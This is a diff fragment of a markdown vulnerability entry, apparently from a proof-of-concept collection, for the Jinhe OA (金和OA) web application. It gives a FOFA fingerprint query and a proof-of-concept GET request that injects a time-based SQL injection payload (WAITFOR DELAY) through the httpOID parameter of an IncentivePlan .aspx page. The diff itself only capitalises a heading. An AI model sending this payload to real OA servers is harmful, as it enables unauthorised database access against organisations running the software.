@@ -8,7 +8,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:2'-- HTTP/1.1
